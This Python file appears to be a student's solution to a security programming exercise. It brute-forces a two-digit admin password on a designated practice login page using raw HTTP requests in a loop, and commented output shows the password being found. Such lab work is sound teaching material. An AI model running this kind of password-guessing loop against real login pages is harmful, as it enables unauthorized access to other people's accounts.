"""
INF601 - Advanced Programming in Python
Sam Boutros
Prof. Zeller
FHSU - Fall 2022
11/2/2022
https://samsclass.info/124/proj14/VP210.htm
"""

# Make a Python script that logs in to this page:
# http://target1.bowneconsulting.com/php/login3.php
# with these parameters:
# Username: admin
# Password: a two-digit number
# You will need to use a loop.

import socket

# Input
target = 'target1.bowneconsulting.com'
port = 80
url = '/php/login3.php'
username = 'admin'
agent = 'python'

# Process, output
for password in range(100):
    pwd = str(password).rjust(2, '0')
    print(f"Trying password '{pwd}'")
    s = socket.socket()
    s.settimeout(2)
    s.connect((target, port))

    # Build request based on requirements above
    req = f"""GET {url}?u={username}&p={pwd} HTTP/1.1\r
Host: {target}\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
DNT: 1\r
User-Agent: {agent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r
Referer: http://{target}{url}\r
Accept-Language: en-US,en;q=0.9\r
\r
"""
    s.send(req.encode())
    reply = s.recv(1024).decode()
    if 'Successful login!' in reply:
        print(f"  Admin password is '{pwd}'")
        break
    s.close()

# Trying password '00'
# Trying password '01'
# Trying password '02'
# Trying password '03'
# Trying password '04'
# Trying password '05'
# Trying password '06'
# Trying password '07'
# Trying password '08'
# Trying password '09'
# Trying password '10'
# Trying password '11'
# Trying password '12'
# Trying password '13'
# Trying password '14'
# Trying password '15'
# Trying password '16'
# Trying password '17'
# Trying password '18'
# Trying password '19'
# Trying password '20'
# Trying password '21'
# Trying password '22'
# Trying password '23'
# Trying password '24'
# Trying password '25'
# Trying password '26'
# Trying password '27'
# Trying password '28'
# Trying password '29'
# Trying password '30'
# Trying password '31'
# Trying password '32'
# Trying password '33'
# Trying password '34'
# Trying password '35'
# Trying password '36'
# Trying password '37'
# Trying password '38'
# Trying password '39'
# Trying password '40'
# Trying password '41'
# Trying password '42'
# Trying password '43'
# Trying password '44'
# Trying password '45'
# Trying password '46'
# Trying password '47'
# Trying password '48'
# Trying password '49'
# Trying password '50'
# Trying password '51'
# Trying password '52'
# Trying password '53'
# Trying password '54'
# Trying password '55'
#   Admin password is '55'
